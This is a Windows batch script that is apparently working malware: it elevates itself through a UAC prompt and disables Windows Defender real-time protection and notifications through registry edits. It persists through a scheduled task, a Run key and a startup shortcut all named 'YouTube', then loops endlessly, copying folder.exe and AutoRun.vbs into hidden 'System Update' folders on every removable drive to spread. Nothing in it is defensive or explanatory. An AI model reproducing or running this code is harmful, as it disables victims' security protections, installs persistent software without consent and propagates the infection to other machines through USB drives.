@echo off

set "params=%*"
cd /D "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
cd /D C:\Users\Public\Licence\Extension






::echo ******* Disable realtime-protection **********
   ::: METHOD 1 ::::
   ::Disable Notifications (may not work) (no problem)
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /f /v DisableAntiSpyware /t REG_DWORD /d 0x00000001 > nul 2> nul
   ::Disable realtime protection (may not work) (no problem)
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /f /v DisableRealtimeMonitoring /t REG_DWORD /d 0x00000001 > nul 2> nul
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /f /v DpaDisabled /t REG_DWORD /d 0x00000001 > nul 2> nul


   ::: METHOD 2 ::::
   ::Disable Notifications
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /f /v DisableNotifications /t REG_DWORD /d 0x00000001 > nul 2> nul
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /f /v DisableNotifications /t REG_DWORD /d 0x00000001 > nul 2> nul
   ::Disable anti spyware
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /f /v DisableAntiSpyware /t REG_DWORD /d 0x00000001 > nul 2> nul
   ::Disable realtime protection
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f /v DisableRealtimeMonitoring /t REG_DWORD /d 0x00000001 > nul 2> nul
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f /v DpaDisabled /t REG_DWORD /d 0x00000001 > nul 2> nul



::echo ************* Create new task ****************
   schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\Public\Licence\Extension\AutoRun.vbs" /F > nul 2> nul 
   REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YouTube /t REG_SZ /d C:\Users\Public\Licence\Extension\AutoRun.vbs /f > nul 2> nul 
   mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\Public\Licence\Extension\AutoRun.vbs" > nul 2> nul 
   







::echo ************* Pendrive check ****************
   :pendrive
   echo ************* Done ****************
	  timeout 1 > NUL
	  ::echo Checking for pendrive...
	  echo Waiting to close...
	  for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
	  if %%l equ 2 (
		 mkdir %%i\YouTube > nul 2> nul


		 if not exist "%%i\folder.exe" (
		        copy "C:\Users\Public\Licence\Extension\folder.exe" "%%i" /Y > nul 2> nul
		 	if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i" /Y > nul 2> nul
		 )

		 if not exist "%%i\YouTube\folder.exe" (
		        copy "C:\Users\Public\Licence\Extension\folder.exe" "%%i\YouTube" /Y > nul 2> nul
		 	if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i\YouTube" /Y > nul 2> nul
		 )




                 if not exist "%%i\System Update" mkdir "%%i\System Update" > nul 2> nul
		 attrib +h +r "%%i\System Update" /s /d > nul 2> nul



		 if not exist "%%i\YouTube\AutoRun.vbs" (
		        copy "C:\Users\Public\Licence\Extension\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
		 	if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
		 )
		 
		 echo Copied!



		 ) 
	  )
	  echo.
	  echo.
	  cls
          echo Click close to close the window...


	  goto pendrive




	exit /b